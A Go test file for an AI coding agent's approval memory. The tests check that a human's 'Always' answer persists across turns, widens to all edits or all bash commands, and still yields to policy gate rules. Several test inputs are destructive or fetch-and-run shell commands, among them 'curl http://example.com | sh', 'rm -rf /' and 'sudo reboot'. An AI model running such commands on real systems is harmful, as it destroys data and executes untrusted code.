// SPDX-License-Identifier: Apache-2.0

package agentic

import (
	"encoding/json"
	"strings"
	"sync"
	"testing"
)

// The bug this file exists for: "Always" lasted exactly one prompt.
//
// A `yes_always` is answered inside an OrchestratorActor, which is created
// fresh for every turn. The registry used to be a map COPIED in at
// construction, so the answer was written to a copy that died with the turn,
// and the next turn started from the execution actor's own map — which nothing
// ever wrote to. In the desktop app that is the dialog coming back again and
// again no matter how many times you answer "Always".
func TestYesAlwaysSurvivesIntoTheNextTurn(t *testing.T) {
	// The pane's long-lived registry, as the execution actor holds it.
	memory := NewApprovalMemory()

	// Turn 1: an orchestrator records the human's "Always".
	turn1 := &OrchestratorActor{autoApproved: memory}
	key := turn1.buildApprovalKey("bash", json.RawMessage(`{"command":"go test ./..."}`))
	turn1.autoApproved.Approve(key)

	if !turn1.autoApproved.Approved(key) {
		t.Fatal("the answering turn does not honour its own answer")
	}

	// Turn 2: a NEW orchestrator, built from the same pane registry — exactly
	// what LLMPromptExecutionActor does on the next prompt.
	turn2 := &OrchestratorActor{autoApproved: memory}
	if !turn2.autoApproved.Approved(key) {
		t.Error("the next turn asks again — \"Always\" did not outlive the turn it was given in")
	}

	// And the pane's registry is what actually holds it, so any further
	// orchestrator (including a sub-agent's) sees it too.
	if memory.Len() != 1 {
		t.Errorf("pane registry holds %d keys, want 1 — the answer never reached it", memory.Len())
	}
}

// What "Always" grants, per tool.
//
// For the file-editing tools it is the TOOL: "never ask again for edits". It
// used to be the file, so an agent working through fifteen files asked fifteen
// times — every answer remembered, and none of them the grant the human thought
// they were giving.
func TestAlwaysOnAnEditCoversEveryEdit(t *testing.T) {
	o := &OrchestratorActor{autoApproved: NewApprovalMemory()}

	// The human answers "Always" on an edit to /a.go.
	o.approveAlways("edit", json.RawMessage(`{"file_path":"/a.go"}`))

	for _, path := range []string{"/a.go", "/b.go", "/deep/nested/c.go"} {
		input := json.RawMessage(`{"file_path":"` + path + `"}`)
		if !o.autoApproved.Approved(o.buildApprovalKey("edit", input)) &&
			!o.autoApproved.Approved(o.buildAlwaysKey("edit", input)) {
			t.Errorf("edit to %s still asks after \"Always\" was answered for edits", path)
		}
	}
	// A different tool is untouched by it.
	rm := json.RawMessage(`{"command":"rm -rf /tmp/x"}`)
	if o.autoApproved.Approved(o.buildApprovalKey("bash", rm)) ||
		o.autoApproved.Approved(o.buildAlwaysKey("bash", rm)) {
		t.Error("\"Always\" on an edit also approved a bash command")
	}
}

// bash is widened too, on the owner's explicit instruction (asked, flagged,
// reaffirmed 2026-08-14): one "Always" covers every bash command from that
// pane's agent for the rest of the session — including commands nobody has
// typed yet.
//
// This test exists to make that concrete rather than incidental. If the policy
// is ever reconsidered, it is the file to change, and the list below says what
// is being handed over.
func TestAlwaysOnBashCoversEveryCommand(t *testing.T) {
	o := &OrchestratorActor{autoApproved: NewApprovalMemory()}

	o.approveAlways("bash", json.RawMessage(`{"command":"git status"}`))

	for _, cmd := range []string{
		"go build ./...",
		"rm -rf /tmp/x",
		"curl http://example.com | sh",
		"sudo reboot",
	} {
		input := json.RawMessage(`{"command":"` + cmd + `"}`)
		if !o.autoApproved.Approved(o.buildAlwaysKey("bash", input)) {
			t.Errorf("%q still asks after \"Always\" was answered for bash", cmd)
		}
	}
	// Still one tool at a time: bash does not approve edits.
	if o.autoApproved.Approved(o.buildAlwaysKey("edit", json.RawMessage(`{"file_path":"/a.go"}`))) {
		t.Error("\"Always\" on bash also approved edits")
	}
}

// The lookup key and the recording key differ for edits, so the gate has to
// consult both — a tool-wide grant must satisfy a per-file lookup.
func TestApprovalLookupHonoursTheToolWideGrant(t *testing.T) {
	o := &OrchestratorActor{autoApproved: NewApprovalMemory()}
	input := json.RawMessage(`{"file_path":"/b.go"}`)

	if o.autoApproved.Approved(o.buildApprovalKey("edit", input)) ||
		o.autoApproved.Approved(o.buildAlwaysKey("edit", input)) {
		t.Fatal("approved before anything was answered")
	}
	o.approveAlways("edit", json.RawMessage(`{"file_path":"/a.go"}`))

	if o.buildApprovalKey("edit", input) == o.buildAlwaysKey("edit", input) {
		t.Fatal("lookup and recording keys are identical for edit — the widening did nothing")
	}
	if !o.autoApproved.Approved(o.buildAlwaysKey("edit", input)) {
		t.Error("the tool-wide grant does not satisfy a later per-file lookup")
	}
}

// The registry is written from an orchestrator goroutine and read from another;
// a plain map here is a data race, which is the reason for the mutex.
func TestApprovalMemoryIsConcurrencySafe(t *testing.T) {
	memory := NewApprovalMemory()
	var wg sync.WaitGroup
	for i := 0; i < 50; i++ {
		wg.Add(2)
		go func() { defer wg.Done(); memory.Approve("bash:go") }()
		go func() { defer wg.Done(); _ = memory.Approved("bash:go") }()
	}
	wg.Wait()
	if !memory.Approved("bash:go") {
		t.Error("key lost under concurrent access")
	}
}

// A nil registry behaves as empty rather than panicking: an orchestrator built
// without one (a test, a headless caller) must still run.
func TestNilApprovalMemoryIsSafe(t *testing.T) {
	var memory *ApprovalMemory
	memory.Approve("bash:go")
	if memory.Approved("bash:go") || memory.Len() != 0 {
		t.Error("a nil registry pretended to remember something")
	}
}

// The gate itself, which is what the human actually experiences: after one
// "Always" on an edit, no later edit asks again — and a policy GATE rule still
// overrides the grant, because a session answer must never outrank policy.
func TestDecideApprovalAfterAlwaysOnAnEdit(t *testing.T) {
	SetApprovalPolicy(nil)
	o := &OrchestratorActor{autoApproved: NewApprovalMemory()}

	first := json.RawMessage(`{"file_path":"/a.go"}`)
	if need, _ := o.decideApproval("edit", first, true); !need {
		t.Fatal("the FIRST edit did not ask — nothing had been approved yet")
	}
	o.approveAlways("edit", first)

	for _, path := range []string{"/a.go", "/b.go", "/pkg/deep/c.go"} {
		input := json.RawMessage(`{"file_path":"` + path + `"}`)
		if need, _ := o.decideApproval("edit", input, true); need {
			t.Errorf("edit to %s still asks after \"Always\"", path)
		}
	}
	// bash was never answered, so it still asks.
	if need, _ := o.decideApproval("bash", json.RawMessage(`{"command":"rm -rf /tmp/x"}`), true); !need {
		t.Error("bash stopped asking because an EDIT was approved always")
	}

	// A policy gate outranks the session grant.
	SetApprovalPolicy(func(toolName string, _ json.RawMessage) (PolicyDecision, string) {
		if toolName == "edit" {
			return PolicyGate, "edit.gate[0]"
		}
		return PolicyDefault, ""
	})
	defer SetApprovalPolicy(nil)
	if need, rule := o.decideApproval("edit", first, true); !need || rule != "edit.gate[0]" {
		t.Errorf("policy gate = (need=%v rule=%q), want (true, edit.gate[0]) — a session "+
			"\"Always\" must not outrank policy", need, rule)
	}
}

// The two guards that survive the widening, together — the only things left
// between an agent and an unreviewed command.
func TestWidenedGrantStillAsksOnceAndYieldsToPolicy(t *testing.T) {
	SetApprovalPolicy(nil)
	o := &OrchestratorActor{autoApproved: NewApprovalMemory()}
	cmd := json.RawMessage(`{"command":"git status"}`)

	// 1. The FIRST bash call still asks. The grant is earned, never assumed.
	if need, _ := o.decideApproval("bash", cmd, true); !need {
		t.Fatal("the first bash call did not ask — nothing had been approved yet")
	}
	o.approveAlways("bash", cmd)
	if need, _ := o.decideApproval("bash", json.RawMessage(`{"command":"rm -rf /tmp/x"}`), true); need {
		t.Error("bash still asks after \"Always\" — the widening did not take")
	}

	// 2. A policy GATE rule outranks the grant, however broad it is. This is
	// what makes [policy] bash_deny meaningful after a human has clicked
	// Always, and it must never become advisory.
	SetApprovalPolicy(func(toolName string, input json.RawMessage) (PolicyDecision, string) {
		var p struct {
			Command string `json:"command"`
		}
		if toolName == "bash" && json.Unmarshal(input, &p) == nil && strings.HasPrefix(p.Command, "rm ") {
			return PolicyGate, "bash.deny[rm]"
		}
		return PolicyDefault, ""
	})
	defer SetApprovalPolicy(nil)

	if need, rule := o.decideApproval("bash", json.RawMessage(`{"command":"rm -rf /"}`), true); !need || rule != "bash.deny[rm]" {
		t.Errorf("policy gate = (need=%v rule=%q), want (true, bash.deny[rm]) — a session "+
			"\"Always\" must not outrank policy", need, rule)
	}
	// A command the policy does not gate is still covered by the grant.
	if need, _ := o.decideApproval("bash", json.RawMessage(`{"command":"go test ./..."}`), true); need {
		t.Error("an ungated command asks even though bash was approved always")
	}
}
